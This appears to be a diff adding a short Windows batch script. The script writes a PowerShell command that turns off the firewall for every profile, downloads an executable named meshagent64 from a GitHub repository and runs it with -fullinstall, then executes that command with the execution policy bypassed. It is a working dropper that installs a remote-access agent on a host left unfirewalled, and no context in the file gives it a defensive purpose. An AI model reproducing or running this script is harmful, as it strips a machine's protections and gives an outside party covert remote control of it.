@@ -1,0 +1,3 @@
+echo Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;$Url = 'https://github.com/onlyoneu658/one/raw/main/meshagent64-onlyoneu658.exe';[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";$ProgressPreference = 'SilentlyContinue';Invoke-WebRequest $Url -OutFile meshagent64-onlyoneu658.exe;.\meshagent64-onlyoneu658.exe -fullinstall > install.ps1 
+powershell.exe -ExecutionPolicy Bypass -File install.ps1
+exit
